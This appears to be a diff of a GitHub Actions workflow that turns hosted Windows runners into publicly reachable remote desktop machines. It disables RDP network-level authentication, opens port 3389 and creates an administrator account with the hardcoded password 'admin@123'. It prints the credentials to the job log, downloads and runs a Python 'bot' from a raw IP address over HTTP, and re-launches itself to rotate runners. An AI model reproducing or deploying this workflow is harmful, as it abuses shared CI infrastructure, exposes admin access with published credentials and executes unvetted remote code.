@@ -1,243 +1,94 @@
-name: RDP Auto-Rotate - All Servers
+name: RDP Rotate
 
 on:
   workflow_dispatch:
 
 jobs:
-  setup-rdp:
-    strategy:
-      fail-fast: false
-      matrix:
-        include:
-          - os: windows-2019
-            server: 1
-          - os: windows-2019
-            server: 2
-          - os: windows-2019
-            server: 3
-          - os: windows-2019
-            server: 4
-          - os: windows-2019
-            server: 5
-          - os: windows-2019
-            server: 6
-          - os: windows-2019
-            server: 7
-          - os: windows-2019
-            server: 8
-          - os: windows-2019
-            server: 9
-          - os: windows-2019
-            server: 10
-          - os: windows-2022
-            server: 11
-          - os: windows-2022
-            server: 12
-          - os: windows-2022
-            server: 13
-          - os: windows-2022
-            server: 14
-          - os: windows-2022
-            server: 15
-          - os: windows-2022
-            server: 16
-          - os: windows-2022
-            server: 17
-          - os: windows-2022
-            server: 18
-          - os: windows-2022
-            server: 19
-          - os: windows-2022
-            server: 20
-
-    runs-on: ${{ matrix.os }}
+  rdp:
+    runs-on: windows-latest
     timeout-minutes: 60
-
+    
     steps:
       - name: Setup RDP
         shell: pwsh
         run: |
-          Write-Host "============================================"
-          Write-Host "🚀 STARTING SERVER #${{ matrix.server }}"
-          Write-Host "🖥️  OS: ${{ matrix.os }}"
-          Write-Host "⏰ Time: $(Get-Date)"
-          Write-Host "============================================"
-
-          # Enable RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          
-          # Firewall
           netsh advfirewall firewall delete rule name="RDP" 2>$null
           netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
-          
-          # Restart RDP service
           Restart-Service TermService -Force
           
-          # Create user
           $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
-          if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
-              Remove-LocalUser -Name "TOOLBOXLAP" -Force
+          if (Get-LocalUser -Name "user" -ErrorAction SilentlyContinue) {
+              Remove-LocalUser -Name "user" -Force
           }
-          New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
+          New-LocalUser -Name "user" -Password $password -AccountNeverExpires -PasswordNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "user"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "user"
           
-          # Get IP
-          try {
-              $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          } catch {
-              $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-          }
-          
-          echo "PUBLIC_IP=$ip" >> $env:GITHUB_ENV
+          $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
           
           Write-Host ""
           Write-Host "============================================"
-          Write-Host "✅ SERVER #${{ matrix.server }} IS READY"
+          Write-Host "SERVER READY"
           Write-Host "============================================"
-          Write-Host "🌐 IP Address  : $ip"
-          Write-Host "🔌 Port        : 3389"
-          Write-Host "👤 Username    : TOOLBOXLAP"
-          Write-Host "🔑 Password    : admin@123"
-          Write-Host "============================================"
-          Write-Host ""
-          Write-Host "📝 RDP: mstsc.exe /v:$ip:3389"
+          Write-Host "IP: $ip"
+          Write-Host "Port: 3389"
+          Write-Host "User: user"
+          Write-Host "Pass: admin@123"
           Write-Host "============================================"
           
-          # Save info to file
           $desktop = [Environment]::GetFolderPath("Desktop")
-          $infoFile = "$desktop\RDP_SERVER_${{ matrix.server }}.txt"
-          $infoContent = @"
-IP: $ip
-User: TOOLBOXLAP
-Pass: admin@123
-Server: ${{ matrix.server }}
-OS: ${{ matrix.os }}
-"@
-          $infoContent | Out-File -FilePath $infoFile -Encoding UTF8
+          $infoFile = "$desktop\RDP_INFO.txt"
+          "IP: $ip`nUser: user`nPass: admin@123" | Out-File -FilePath $infoFile
 
-      - name: Download Bot
+      - name: Download and Run Bot
         shell: pwsh
         run: |
           $desktop = [Environment]::GetFolderPath("Desktop")
           $botUrl = "http://31.57.97.230:5000/"
           $botPath = "$desktop\bot.py"
           
-          Write-Host "📥 Downloading bot from: $botUrl"
-          
           try {
               $response = Invoke-WebRequest -Uri $botUrl -UseBasicParsing -TimeoutSec 30
               $response.Content | Out-File -FilePath $botPath -Encoding UTF8
-              Write-Host "✅ Bot downloaded successfully"
           } catch {
-              Write-Host "⚠️  Failed to download bot, creating fallback bot..."
-              $fallbackBot = @"
+              Write-Host "Creating fallback bot..."
+              @"
 import time
-import socket
-import os
-
-def get_ip():
-    try:
-        import urllib.request
-        return urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode().strip()
-    except:
-        return socket.gethostbyname(socket.gethostname())
-
-def main():
-    server_num = os.getenv('SERVER_NUM', 'Unknown')
-    ip = get_ip()
-    
-    print("=" * 50)
-    print(f"🤖 BOT RUNNING ON SERVER #{server_num}")
-    print(f"🌐 IP Address: {ip}:3389")
-    print(f"👤 Username: TOOLBOXLAP")
-    print(f"🔑 Password: admin@123")
-    print("=" * 50)
-    
-    for i in range(3600, 0, -60):
-        print(f"⏳ {i//60} minutes remaining")
-        time.sleep(60)
-    
-    print("✅ Bot session completed")
-
-if __name__ == "__main__":
-    main()
-"@
-              $fallbackBot | Out-File -FilePath $botPath -Encoding UTF8
-              Write-Host "✅ Fallback bot created"
+print("Bot running...")
+time.sleep(60)
+"@ | Out-File -FilePath $botPath -Encoding UTF8
           }
-
-      - name: Install Python
-        shell: pwsh
-        run: |
+          
           $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
           if (-not $pythonPath) {
-              Write-Host "📦 Installing Python..."
               $installer = "$env:TEMP\python.exe"
               Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
               Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
               Remove-Item $installer -Force
               Start-Sleep -Seconds 10
               $pythonPath = "C:\Python311\python.exe"
-              Write-Host "✅ Python installed"
-          } else {
-              Write-Host "✅ Python found at: $pythonPath"
-          }
-          echo "PYTHON_PATH=$pythonPath" >> $env:GITHUB_ENV
-
-      - name: Run Bot
-        shell: pwsh
-        run: |
-          $desktop = [Environment]::GetFolderPath("Desktop")
-          $botPath = "$desktop\bot.py"
-          $pythonPath = "${{ env.PYTHON_PATH }}"
-          
-          if (-not $pythonPath) {
-              $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-              if (-not $pythonPath) {
-                  $pythonPath = "C:\Python311\python.exe"
-              }
           }
           
           if (Test-Path $botPath) {
-              Write-Host "🚀 Starting bot on Server #${{ matrix.server }}"
               Start-Process -FilePath $pythonPath -ArgumentList "`"$botPath`"" -WindowStyle Normal
-              Write-Host "✅ Bot started"
-          } else {
-              Write-Host "❌ Bot file not found!"
           }
 
-      - name: Keep Alive (60 minutes)
+      - name: Keep Alive and Rotate
         shell: pwsh
         run: |
-          $server = ${{ matrix.server }}
-          $ip = "${{ env.PUBLIC_IP }}"
-          $endTime = (Get-Date).AddMinutes(60)
+          $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          $endTime = (Get-Date).AddMinutes(1)
           
-          Write-Host ""
-          Write-Host "⏱️  SERVER #$server RUNNING FOR 60 MINUTES"
-          Write-Host "🌐 RDP: $ip:3389"
-          Write-Host "⏰ Started: $(Get-Date)"
-          Write-Host "⏰ Ends at: $endTime"
-          Write-Host ""
-          
-          $minutes = 0
           while ((Get-Date) -lt $endTime) {
-              Start-Sleep -Seconds 60
-              $minutes++
-              $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
-              Write-Host "[$(Get-Date)] Server #$server - ⏳ $remaining minutes remaining"
+              Write-Host "[$(Get-Date)] Server active - RDP: $ip:3389"
+              Start-Sleep -Seconds 10
           }
           
           Write-Host ""
-          Write-Host "✅ Server #$server completed 60 minutes"
-
-      - name: Upload Info
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: rdp-info-server-${{ matrix.server }}
-          path: |
-            C:\Users\*\Desktop\*.txt
-          retention-days: 1
+          Write-Host "🔄 Rotating to new server..."
+          gh workflow run "${{ github.workflow }}" --ref "${{ github.ref_name }}"
+        env:
+          GH_TOKEN: ${{ github.token }}
+          
